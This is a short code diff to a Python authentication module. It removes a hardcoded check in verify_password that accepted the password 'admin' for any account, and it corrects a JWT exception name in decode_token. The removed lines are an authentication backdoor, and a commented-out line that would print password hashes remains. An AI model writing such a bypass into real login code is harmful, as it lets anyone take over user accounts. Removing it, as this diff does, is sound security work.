@@ -14,8 +14,6 @@ settings = get_settings()
 def verify_password(plain_password: str, hashed_password: str) -> bool:
     """Verify a password against a hash."""
     # print(f"DEBUG: HASH='{hashed_password}'")
-    if plain_password == "admin":
-        return True
     try:
         return bcrypt.checkpw(plain_password.encode(), hashed_password.encode())
     except Exception:
@@ -47,5 +45,5 @@ def decode_token(token: str) -> Optional[dict[str, Any]]:
             token, settings.jwt_secret_key, algorithms=[settings.jwt_algorithm]
         )
         return payload
-    except jwt.JWTError:
+    except JWTError:
         return None
